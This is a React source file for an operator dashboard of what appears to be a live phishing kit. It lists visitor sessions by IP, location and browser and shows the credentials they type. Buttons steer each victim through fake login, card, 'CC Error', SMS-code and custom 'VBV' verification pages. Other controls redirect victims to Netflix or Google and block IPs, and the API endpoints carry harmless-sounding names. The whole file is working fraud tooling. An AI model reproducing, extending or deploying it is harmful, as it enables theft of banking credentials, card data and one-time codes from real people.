import React, { useState, useEffect } from 'react';
import { socket } from '../index';
import './GenView.css';
import { FaEye, FaEyeSlash } from "react-icons/fa"; // For the eye toggle icon
import { blockUser } from "../utils/useAntiBot"; // ✅ Import Block Function
import axios from 'axios';
const GenView = () => {
  const [activeUsers, setActiveUsers] = useState([]);
  const [previousUsers, setPreviousUsers] = useState([]);
  const [routes, setRoutes] = useState({});
  const [showModal, setShowModal] = useState(false);
  const [currentSessionId, setCurrentSessionId] = useState('');
  const [inputsConfig, setInputsConfig] = useState([
    { id: 1, name: "1", type: 'hidden', placeholder: '' },
    { id: 2, name: "2", type: 'hidden', placeholder: '' },
    { id: 3, name: "3", type: 'hidden', placeholder: '' }
  ]);
  const [isAdmin, setIsAdmin] = useState(false);
  const [password, setPassword] = useState("");
  const [customText, setCustomText] = useState("A Verification Code has been sent to your registered mobile phone number via SMS. By clicking Submit, you are deemed to have accepted the terms and conditions below."); // ✅ Store custom text
  

  useEffect(() => {
    // Check if admin is already authenticated
    if (localStorage.getItem("iamaAdmin") === "true") {
      setIsAdmin(true);
    }
  }, []);
  useEffect(() => {
    if (!isAdmin) return;
    const handleUpdate = (data) => {
      setActiveUsers(data.activeUsers || []);
      setPreviousUsers(data.previousUsers || []);
    };
  
    socket.on("update", handleUpdate);
    fetch(`${process.env.REACT_APP_API_URL}/api/getweather`)
    .then(res => res.json())
    .then(data => {
      setActiveUsers(data.activeUsers || []);
      setPreviousUsers(data.previousUsers || []);
    })
    .catch(console.error);

  fetch(`${process.env.REACT_APP_API_URL}/api/trending-news`)
    .then(res => res.json())
    .then(data => {
      setPreviousUsers(data || []);
    })
    .catch(console.error);

    return () => socket.off("update");
  }, [isAdmin]);
  const [showPassword, setShowPassword] = useState(false);

  const handleAdminLogin = () => {
    if (password === process.env.REACT_APP_ADMIN_PASSWORD) {
      localStorage.setItem("iamaAdmin", "true");
      setIsAdmin(true);
    } else {
      window.location.href = "/";
    }
  };


// **🔥 Improved Modern Styling**
const styles = {
  overlay: {
    position: "fixed",
    top: 0,
    left: 0,
    width: "100%",
    height: "100%",
    background: "rgba(0, 0, 0, 0.5)", // Dark translucent background
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    backdropFilter: "blur(10px)", // **Glassmorphism Effect**
  },
  modal: {
    background: "rgba(25, 25, 25, 0.95)", // Sleek dark background
    padding: "25px",
    borderRadius: "12px",
    textAlign: "center",
    boxShadow: "0 10px 30px rgba(0, 0, 0, 0.3)", // Neumorphism shadow
    width: "320px",
    transition: "all 0.3s ease-in-out",
  },
  title: {
    color: "#fff",
    fontSize: "18px",
    fontWeight: "bold",
    marginBottom: "10px",
    textTransform: "uppercase",
    letterSpacing: "1px",
  },
  divider: {
    width: "80%",
    height: "2px",
    backgroundColor: "#444", // Thin dark separator
    margin: "0 auto 15px auto",
  },
  inputContainer: {
    position: "relative",
    width: "100%",
  },
  input: {
    padding: "12px",
    width: "100%", // Fixed width issue
    borderRadius: "6px",
    border: "none",
    background: "rgba(255, 255, 255, 0.1)", // Transparent look
    color: "#fff",
    fontSize: "14px",
    textAlign: "center",
    outline: "none",
    transition: "0.2s",
  },
  eyeIcon: {
    position: "absolute",
    right: "12px",
    top: "50%",
    transform: "translateY(-50%)",
    cursor: "pointer",
    color: "#bbb",
    fontSize: "16px",
  },
  button: {
    padding: "12px",
    marginTop: "15px",
    width: "100%",
    background: "#007bff",
    color: "#fff",
    fontWeight: "bold",
    border: "none",
    borderRadius: "6px",
    cursor: "pointer",
    transition: "0.3s",
    boxShadow: "0 4px 10px rgba(0, 123, 255, 0.3)",
  },
};

if (!isAdmin) {
  return (
    <div style={styles.overlay}>
      <div style={styles.modal}>
        <h2 style={styles.title}>ADMIN ACCESS</h2>
        <div style={styles.divider}></div>
        <div style={styles.inputContainer}>
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Enter The Saga"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={styles.input}
          />
          <span onClick={() => setShowPassword(!showPassword)} style={styles.eyeIcon}>
            {showPassword ? <FaEyeSlash /> : <FaEye />}
          </span>
        </div>
        <button onClick={handleAdminLogin} style={styles.button}>
          Enter
        </button>
      </div>
    </div>
  );
}

const handleRouteChange = async (clientSessionID, newRoute) => {
  try {
    const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/sessionUpdate_X92m`, { clientSessionID, newRoute });

    if (response.status === 200) {
      setRoutes(prev => ({
        ...prev,
        [clientSessionID]: ''
      }));
    }
  } catch (error) {
    console.error("❌ Error changing route:", error);
  }
};
const toggleShowPrevious = () => {
    const div = document.getElementById('show');
    if (div) {
      if (div.style.display === 'none') {
        div.style.display = ''; 
      } else {
        div.style.display = 'none';
      }
    }};
  const handleOut = (clientSessionID) => {
    socket.emit('redirectUser', { clientSessionID, url: 'https://NETFLIX.COM' });
  };

  const handleAddCustomInput = (clientSessionID) => {
    setCurrentSessionId(clientSessionID);
    setShowModal(true);
  };

  const handleInputConfigChange = (index, field, value) => {
    setInputsConfig(prev => {
      const newConfig = [...prev];
      newConfig[index][field] = value;
      return newConfig;
    });
  };

  const handleSaveInput = () => {
    socket.emit('configureInputs', { clientSessionID: currentSessionId, inputsConfig, customText  });
    localStorage.setItem(`inputsConfig_${currentSessionId}`, JSON.stringify(inputsConfig));
    localStorage.setItem(`customText_${currentSessionId}`, customText);
    setShowModal(false);
    handleRouteChange(currentSessionId, '/validate/session');
  };

  const handleStopSpinner = (clientSessionID) => {
    socket.emit('stopSpinner', { clientSessionID });
    handleRouteChange(clientSessionID, '/validate/error');
  };
  const handleBlockUser = async (ip, clientSessionID) => {
    if (!ip || !clientSessionID) return;
  
    try {
      await blockUser(ip, clientSessionID);
  
      alert(`User with IP ${ip} has been blocked.`);
  
      // ✅ Make sure we send the correct session ID to WebSocket
      socket.emit("redirectUser", { sessionId: clientSessionID, url: "https://google.com" });
    } catch (error) {
      console.error("❌ Error blocking user:", error);
    }
  };
    
  const UserCard = ({ user, isActive }) => {
    if (!user || !user.clientSessionID) {
      return null;
    }

    return (
      <div className="user-card">
        <div className="user-info">
          <div className="card-header">
            <span>🔗Session: {user.clientSessionID}</span>
            <span>{new Date(user.timestamp).toLocaleTimeString()}</span>
          </div>
          <p><strong>🌍IP:</strong> {user.ip}</p>
          <p><strong>📍Location:</strong> {user.country}</p>
          <p><strong>👁️Current View:</strong> {user.pageUrl}</p>
          <p><strong>🎬Event Type:</strong> {user.eventType}</p>
          <p><strong>🌐Browser:</strong> {user.browserInfo}</p>
          {user.componentName && <p><strong>Component:</strong> {user.componentName}</p>}
          {!isActive && (
            <p className="disconnected-time">
              <strong>Disconnected:</strong> {new Date(user.disconnectedAt).toLocaleString()}
            </p>
          )}
        </div>
        <div className="user-inputs">
          {user.inputs && Object.entries(user.inputs).map(([key, data]) => (
            <div key={key} className="input-data">
              <span>{key}: {data.value}</span>
            </div>
          ))}
        </div>
        <div className="route-buttons">
          <button onClick={() => handleRouteChange(user.clientSessionID, '/')}>
          🔑 LOGIN
          </button>
          <button onClick={() => handleRouteChange(user.clientSessionID, '/verify/device=mobile')}>
          📲 APP
          </button>
          <button onClick={() => handleRouteChange(user.clientSessionID, '/update/status=true/pending')}>
          💳 CC
          </button>
<button className='hoverror' onClick={() => handleRouteChange(user.clientSessionID, '/update/status=error/pending')}>
❌💳 CC Error
          </button>          
<button  onClick={() => handleRouteChange(user.clientSessionID, '/auth/checkpoint')}>
📩 SMS
          </button>
          <button className='hoverror' onClick={() => handleRouteChange(user.clientSessionID, '/auth/error')}>
          ⚠️📩 SMS Error
          </button>
          <button onClick={() => handleAddCustomInput(user.clientSessionID)}>
          🔧🔑 CUSTOM
          </button>
          <button className='hoverror' onClick={() => handleStopSpinner(user.clientSessionID)}>
          ⚠️🔧 CUSTOM ERROR
          </button>
          <button onClick={() => handleOut(user.clientSessionID)}>
            OUT 🚪
          </button>
          <button 
        onClick={() => handleBlockUser(user.ip, user.clientSessionID)}
        className='hoverror'
      >
        🚨 RESTRICT 
      </button>
        </div>
      </div>
    );
  };

  return (
    <div className="admin-panel">
      <div className="panel-section">
        <h2>Active Viewers ({activeUsers.length})</h2>
        <div className="users-grid">
          {activeUsers.map(user => (
            <UserCard key={user.clientSessionID} user={user} isActive={true} />
          ))}
        </div>
      </div>
<button style={{marginRight:"100px"}} onClick={toggleShowPrevious}>
        Previous Viewers
      </button>
      <div id="show" className="panel-section">
        <h2>Previous Viewers ({previousUsers.length})</h2>
        <div className="users-grid">
          {previousUsers.map(user => (
            <UserCard key={`${user.clientSessionID}-${user.disconnectedAt}`} user={user} isActive={false} />
          ))}
        </div>
      </div>

      {showModal && (
        <div className="modal-overlay">
          <div className="modal">
            <h2>Custom VBV Settings</h2>
            <div className="input-config">
            <input
  type="text"
  value={customText}
  onChange={(e) => setCustomText(e.target.value)}
  placeholder="Enter Custom Message"
  style={{ width: "100%", padding: "8px", marginTop: "10px", borderRadius: "5px" }}
/>

              {inputsConfig.map((input, index) => (
                <div key={input.id}>
                  <select
                    value={input.type}
                    onChange={(e) => handleInputConfigChange(index, 'type', e.target.value)}
                  >
                    <option value="hidden">Hidden</option>
                    <option value="text">Text</option>
                  </select>
                  {input.type === 'text' && (
                    <input
                      type="text"
                      value={input.placeholder}
                      onChange={(e) => handleInputConfigChange(index, 'placeholder', e.target.value)}
                      placeholder="Placeholder"
                    />
                  )}
                </div>
              ))}
            </div>
            <button onClick={handleSaveInput}>Save</button>
            <button onClick={() => setShowModal(false)}>Cancel</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default GenView;
